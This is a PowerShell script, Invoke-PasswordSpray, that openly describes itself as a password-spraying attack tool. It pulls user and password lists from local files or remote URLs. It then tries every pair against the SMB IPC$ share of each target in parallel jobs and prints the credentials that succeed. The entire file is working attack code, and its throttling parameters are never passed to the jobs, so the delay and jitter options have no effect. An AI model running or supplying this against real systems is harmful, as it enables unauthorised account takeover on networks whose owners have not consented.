<#
  .SYNOPSIS
    Execute a password spraying attack.
  .PARAMETER Targets
    Target, comma delimited targets, a local targets file, or an online comma delimited targets string.
  .PARAMETER Users
    User, comma delimited users, a local users file, or an online comma delimited users string.
  .PARAMETER Passwords
    Password, comma delimited passwords, a local passwords file, or an online comma delimited passwords string.
  .PARAMETER Split
    Split up requests between each target.
  .PARAMETER Delay
    A delay between each authentication attempt, in seconds.
  .PARAMETER Jitter
    Increase the range of randomness in the delay.
  .NOTES
    Author: Luke Baggett
    Date: August 6, 2014
#>
function Invoke-PasswordSpray
{
  param(
    [Parameter(Mandatory=$True)]$Targets,
    [Parameter(Mandatory=$True)]$Users,
    [Parameter(Mandatory=$True)]$Passwords,
    [switch]$Split=$False,
    [double]$Jitter = 0.20,
    [double]$Delay = 0.00
  )

  $Parameters = @("Targets","Users","Passwords")
  foreach($Parameter in $Parameters)
  {
    if((Test-Path (Get-Variable -Name $Parameter -ValueOnly)) -eq $True)
    {
      Set-Variable -Name $Parameter -Value (Get-Content (Get-Variable -Name $Parameter -ValueOnly))
    }
    elseif((Get-Variable -Name $Parameter -ValueOnly).Contains("http://") -or (Get-Variable -Name $Parameter -ValueOnly).Contains("https://"))
    {
      Set-Variable -Name $Parameter -Value ((New-Object System.Net.WebClient).DownloadString((Get-Variable -Name $Parameter -ValueOnly)).Split(","))
    }
  }

  $Jobs = @()
  $ScriptBlock = {
    param(
      $Target,
      $Users,
      $Passwords,
      $Jitter,
      $Delay
    )
    $Result=@()
    $Random = New-Object System.Random
    foreach($User in $Users)
    {
      foreach($Password in $Passwords)
      {
        Start-Sleep $Random.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
        if((New-SmbMapping -RemotePath \\$Target\IPC$ -UserName $User -Password $Password 2>&1).Status -eq "OK")
        {
          $Result += ((Get-Date -Format [hh:mm:ss]) + " " + $Target + ":" + $User + ":" + $Password)
          Remove-SmbMapping -RemotePath \\$Target\IPC$ -Force -Confirm 2>&1 | Out-Null
        }
      }
    }
    return $Result
  }

  if($Split)
  {
    $SplitUsers=@{}
    $Base = 0
    $TargetCounter = -1
    $ChunkSize = [int]($Users.Count/$Targets.Count)
    while($Base -lt $Users.Count)
    {
      $TargetCounter += 1
      if(($Base + $ChunkSize) -gt $Users.Count)
      {
        $SplitUsers[$TargetCounter] = $Users[$Base..($Users.Count-1)]
        break
      }
      $SplitUsers[$TargetCounter] = $Users[$Base..($Base+$Chunksize-1)]
      $Base+=$ChunkSize
    }
  }

  Write-Host ((Get-Date -Format [hh:mm:ss]) + " Starting Attack... ")
  foreach($Target in $Targets)
  {
    if($Split){$Arguments = @($Target,$SplitUsers[$Targets.IndexOf($Target)],$Passwords)}
    else{$Arguments = @($Target,$Users,$Passwords)}
    $Jobs += (Start-Job $ScriptBlock -ArgumentList $Arguments).Name
  }

  foreach($JobName in $Jobs)
  {
    foreach($Result in (Wait-Job -Name $JobName | Receive-Job)){$Result}
    Remove-Job -Name $JobName -Force
    Remove-SmbMapping -RemotePath \\$JobName[0]\IPC$ -Force -Confirm
  }
  Write-Host ((Get-Date -Format [hh:mm:ss]) + " All Jobs Complete. ")
}